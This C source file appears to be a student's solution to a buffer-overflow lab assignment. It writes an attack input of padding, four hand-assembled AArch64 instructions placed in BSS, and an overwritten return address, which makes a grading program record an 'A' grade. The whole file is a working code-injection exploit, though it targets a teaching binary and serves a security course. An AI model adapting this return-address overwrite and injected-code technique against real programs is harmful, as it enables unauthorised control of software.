/*--------------------------------------------------------------------*/
/* createdataA.c                                                           */
/* Author: Marti Vives and Minh-Thi Nguyen                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/* reads from the commandline the name(s) of the
student (assumes it does not exceed 48 bytes). 
Writes to a file named dataB */

int main(int argc, char* argv[])
{
	int i;
	unsigned long j;
	char* p;
	unsigned long BSS_start_adr = 0x420058;
	unsigned long mov_adr_BSS;
	unsigned long cont_name2buf;
	unsigned long cont_name = 0;
	unsigned int mov;
	unsigned int adr;
	unsigned int strb;
	unsigned int b;

	FILE *psFile; /* dataB file */

	psFile = fopen("dataA", "w");

	/* recall argv[0] is the program name so start at 1 */
	for (i = 1; i < argc; i++)
	{

		/* put each string argv */
		for (p = argv[i]; *p != '\0'; p++)
		{
			putc(*p,psFile);
		}

		cont_name+=strlen(argv[i]);
		/* add a space between argv's */
		if (i != (argc-1)) {
			putc(' ',psFile);
			cont_name++;
		}
	}
	/* need a terminating null char */
	putc('\0',psFile);
	cont_name++;

	/* need to add nullbytes to make cont_name
	a multiple of 4 due to the assembly 4byte addresses */
	while(cont_name % 4 != 0){
		putc('\0',psFile);
		cont_name++;
	}

	mov_adr_BSS = BSS_start_adr+cont_name;

	/* Add instructions to set my A grade */
	/* mov w0, 'A' */
	mov = MiniAssembler_mov(0x00,0x41);

	/* adr x1, grade */
	adr = MiniAssembler_adr(0x01,0x420044,mov_adr_BSS+4);

	/* strb w0,[x1] */
	strb = MiniAssembler_strb(0x00,0x01);

	/* b to printf in main */
	b = MiniAssembler_b(0x400864,mov_adr_BSS+4*3);

	/* now write that */
 	fwrite(&mov, sizeof(unsigned int), 1, psFile);
 	fwrite(&adr, sizeof(unsigned int), 1, psFile);
 	fwrite(&strb, sizeof(unsigned int), 1, psFile);
 	fwrite(&b, sizeof(unsigned int), 1, psFile);

	cont_name+=4*sizeof(unsigned int);
	/* Finish filling all the buf array */
	cont_name2buf = 48-cont_name;
	for (j = 0; j < cont_name2buf; j++)
 		putc('\0', psFile); 

 	/* Rewrite return addresss to main directed at setting B grade */
 	fwrite(&mov_adr_BSS, sizeof(unsigned long), 1, psFile);

	return 0;
}


